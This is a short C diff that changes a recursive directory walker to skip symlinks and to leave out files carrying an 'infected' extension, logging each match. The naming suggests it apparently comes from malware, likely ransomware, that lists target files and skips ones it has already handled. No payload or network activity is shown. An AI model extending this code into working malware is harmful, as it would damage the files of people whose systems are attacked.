@@ -161,10 +161,29 @@ void walkdir(cvector_vector_type(char*)* paths, char* parent_dir)
             memset(path, 0, MAX_PATH_LENGTH);
             free(path);
         }
-        else if (S_ISREG(ent_info.st_mode))
+        else if (S_ISREG(ent_info.st_mode) && !S_ISLNK(ent_info.st_mode))
         {
+            if (is_infected_file(path))
+            {
+                memset(path, 0, MAX_PATH_LENGTH);
+                free(path);
+                continue;
+            }
             cvector_push_back(*paths, path);
         }
     }
     closedir(dir);
+}
+
+int is_infected_file(char* path)
+{
+    char* ptr = 0;
+    
+    ptr = strstr(path, INFECTED_FILE_EXT);
+    if (ptr != 0)
+    {
+        fprintf(logger, "%s, %s\n", path, ptr);
+        return !strcmp(ptr, INFECTED_FILE_EXT);
+    }
+    return 0;
 }
